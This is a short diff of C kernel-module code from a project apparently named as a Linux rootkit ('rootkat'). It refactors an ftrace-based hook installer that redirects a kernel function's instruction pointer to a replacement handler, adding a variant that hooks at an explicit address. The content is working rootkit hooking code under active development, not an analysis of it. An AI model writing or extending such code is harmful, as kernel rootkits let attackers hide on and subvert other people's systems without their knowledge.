@@ -19,15 +19,15 @@ static void notrace rootkat_ftrace_thunk(unsigned long ip, unsigned long parent_
 	regs->ip = (unsigned long)h->replacement;
 }
 
-int rootkat_hook_install(struct rootkat_hook *h)
+int rootkat_hook_install_at(struct rootkat_hook *h, unsigned long addr)
 {
 	int rc;
 
-	h->target = rootkat_resolve(h->candidates, NULL);
-	if (!h->target) {
-		pr_err(TAG "no target resolved\n");
+	if (!addr) {
+		pr_err(TAG "install_at: addr is 0\n");
 		return -ENOENT;
 	}
+	h->target = addr;
 	h->original = (void *)h->target;
 
 	h->ops.func = rootkat_ftrace_thunk;
@@ -52,6 +52,17 @@ int rootkat_hook_install(struct rootkat_hook *h)
 
 	pr_info(TAG "hooked %lx\n", h->target);
 	return 0;
+}
+
+int rootkat_hook_install(struct rootkat_hook *h)
+{
+	unsigned long addr = rootkat_resolve(h->candidates, NULL);
+
+	if (!addr) {
+		pr_err(TAG "no target resolved\n");
+		return -ENOENT;
+	}
+	return rootkat_hook_install_at(h, addr);
 }
 
 void rootkat_hook_remove(struct rootkat_hook *h)
